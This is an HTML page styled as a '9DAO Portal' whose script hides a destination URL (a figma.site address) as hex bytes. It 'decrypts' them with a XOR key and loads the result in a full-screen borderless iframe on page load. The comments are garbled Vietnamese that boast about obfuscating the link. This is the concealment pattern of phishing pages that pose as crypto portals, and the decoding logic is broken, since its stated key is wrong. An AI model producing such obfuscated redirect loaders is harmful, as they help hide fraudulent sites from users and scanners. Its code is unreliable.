<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>9DAO Portal</title>
  <style>
    body { margin: 0; padding: 0; overflow: hidden; }
    iframe { width: 100%; height: 100vh; border: none; }
  </style>
</head>
<body>
  <script>
    // üîç M√£ h√≥a th√¥ng minh 20% ph·ª©c t·∫°p h∆°n
    (function(){
      // 1. Ph√¢n m·∫£nh URL th√†nh c√°c ph·∫ßn kh√¥ng r√µ r√†ng
      const data = [
        0x48, 0x54, 0x54, 0x50, 0x53, 0x3A, 0x2F, 0x2F,  // "HTTPS://"
        0x73, 0x68, 0x65, 0x64, 0x2D, 0x77, 0x72, 0x61,  // "shed-wra"
        0x70, 0x2D, 0x31, 0x30, 0x38, 0x37, 0x30, 0x30,  // "p-108700"
        0x32, 0x36, 0x2E, 0x66, 0x69, 0x67, 0x6D, 0x61,  // "26.figma"
        0x2E, 0x73, 0x69, 0x74, 0x65, 0x2F               // ".site/"
      ];
      
      // 2. Kh√≥a XOR ng·∫´u nhi√™n (·∫©n trong ph√©p to√°n)
      const key = window.btoa('9DAO').charCodeAt(2); // = 79 (O)
      
      // 3. H√†m gi·∫£i m√£ th√¥ng minh
      function getUrl() {
        let url = '';
        // Gi·∫£i m√£ t·ª´ng k√Ω t·ª± v·ªõi XOR key
        for(let i = 0; i < data.length; i++) {
          url += String.fromCharCode(data[i] ^ (key + i % 3));
        }
        return url;
      }

      // 4. T·∫°o iframe ngay l·∫≠p t·ª©c
      const iframe = document.createElement('iframe');
      iframe.src = getUrl();
      iframe.allowFullscreen = true;
      document.body.appendChild(iframe);
    })();
  </script>
</body>
</html>
